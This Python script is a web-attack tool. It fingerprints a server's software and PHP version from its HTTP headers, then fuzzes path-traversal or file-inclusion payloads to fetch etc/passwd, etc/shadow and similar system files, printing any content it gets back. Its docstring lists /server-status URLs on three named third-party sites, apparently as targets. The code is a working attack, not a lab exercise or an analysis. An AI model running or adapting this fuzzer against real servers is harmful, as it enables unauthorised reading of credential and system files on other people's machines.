#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
apt-get install python3-requests
apt-get install python3-nmap
pip3 install ipaddress


http://cyclelogistics.eu/server-status
http://www.bhdesign.com/server-status
http://ingria.com/server-status
"""

import nmap, socket, argparse
from urllib.parse import urlparse
import ipaddress as ipa
from requests import head,get
import re
import os

nm = nmap.PortScanner()
headers = {'user-agent': 'd3s'}
common_linux_files=["etc/passwd","etc/issue",
                    "etc/shadow","etc/motd"]

def scanningHost(url):
    url_object = urlparse(url)
    host,protocol,netloc= getHost(url_object)
    print("\nHOST: {}".format(host))
    #print(type(host))
    #Nmap library
    #scann = nm.scan(host,'80,443','-O')
    #print(scann)
    #os = getOpSystem(scann,host)
    #print("\nO.S.: {}".format(os))
    #Requests Library
    server = None
    php_v = None
    _url = None
    srv_ver = None
    distro = None
    try:
        header=head(protocol+'://'+netloc,headers=headers)
        #print(header.headers)
        print("STATUS CODE: {}".format(header.status_code))
        if 'Server' in header.headers:
            server = header.headers['Server']
        if 'X-Powered-By' in header.headers:
            php_v = header.headers['X-Powered-By']
        if header.status_code > 400:
            print("URL: {}".format(header.url))
            print("STATUS CODE: {}".format(header.status_code))
        #print(header.headers)
        elif header.status_code in range(200,209,1):
            _url = url
        elif header.status_code in range(300,304,1):
            ##Redireccion
            _url = header.headers['Location']


    except Exception as e:
        print("ERROR. Cannot establish a new connection")
        exit(2)
        #print(e)
        #print(type(e))
    if server is not None:
        #print("MMM: {}".format(server))
        server,srv_ver,distro = parseServer(server)
    if php_v is not None:
        php_v = parsePhp(php_v)
    print("URL: {}".format(_url))
    print("SERVER: {} - VERSION: {}".format(server,srv_ver))
    print("DISTRO: {}". format(distro))
    print("PHP VERSION: {}".format(php_v))

    return _url

    """
    Consulta en DB
    """

    """
    """

    """
    Fuzzing
    """
def fuzzer(u,p):
    print("Reading given file: {}".format(p))
    with open(p,'r') as f:
        pay = f.readlines() 
        f.close()    
    for i in pay:
        mod_url = makeUrl(u,i)
        #print(mod_url)
        for e in common_linux_files:
            _payload=makePayload(mod_url,e)
            #print(_payload)
            payload_req = get(_payload,headers=headers)
            print("Trying...[{}] : {}".format(payload_req.status_code,payload_req.request.url))
            if payload_req.status_code in range(400,409,1):
                continue
            elif payload_req.status_code == 200:
                print(payload_req.text)
            



    """
    """

def makeUrl(url,payload):
    #if url[-1] is '/':
    return url+payload

def makePayload(u,f):
    return re.sub(r'{FILE}',f,u).rstrip()


def verifyPayFile(path):
    if os.path.isfile(path):
        return
    else:
        print("ERROR. The file does not exist")
        exit(2)

def parseServer(srv):
    #(\w+)/?([0-9]+(\.?[0-9]+)+?)?[ ]?\(?(\w+)?\)?
    #(\w+)/?([0-9]+(\.?[0-9]+)+)?[ ]?\(?(\w+)?\)?
    #(\w+)/?([0-9]+(\.?[0-9]+)+)[ ]\((\w+)\)
    match = re.search(r'(\w+)/?([0-9]+(\.?[0-9]+)+)?[ ]?\(?(\w+)?\)?', srv)
    if match:
        #print(match.group(1)) 
        #print(match.group(2))
        #print(match.group(4))
        return match.group(1),match.group(2),match.group(4)
    return srv

def parsePhp(version):
    #PHP/?(([0-9]+(\.?[0-9]+)+)(-[0-9]+)?)
    match = re.search(r'PHP/?(([0-9]+(\.?[0-9]+)+)(-[0-9]+)?)',version)
    if match:
        return match.group(1)
    return version

def getHost(URLobject):
    netloc = URLobject.netloc
    proto = URLobject.scheme
    print(netloc)
    try:
        ip_add = ipa.ip_address(netloc)
        print(ip_add)
        return str(ip_add),proto,netloc
    except ValueError:
        ##domain_name
        return socket.gethostbyname(netloc),proto,netloc
    
def getOpSystem(sc,ip):
    try:
        return sc['scan'][ip]['osmatch'][0]['name']
    except Exception as e:
        print("CHALE:\n")
        print(e)
        print(type(e))
    return

parser = argparse.ArgumentParser(description='Python Script that performs fuzzing targeting web servers')
parser.add_argument(
    'target', type=str, nargs=1, help='URL that\'ll be fuzzed'
    )
parser.add_argument(
    '-p','--payload',dest='a_payload', action='store_true',default=False,help='Set the payload to use'
    )
parser.add_argument(
    '-f','--pfile',dest='pay_file', type=str,help='Use the choosen PAY_FILE file from which payloads will be get'
    )
parser.add_argument(
    '-v','--verbose',dest='verbose',action='store_true',default=False,help='Enable verbosity mode'
    )

if __name__ == '__main__':
    try: 
        args = parser.parse_args()
        print(args.target[0])
        print(args.a_payload)
        print(args.pay_file)
        print(args.verbose)
        verifyPayFile(args.pay_file)
        url = scanningHost(args.target[0])
        fuzzer(url,args.pay_file)



    except Exception as e:
        print(e)
        print(type(e))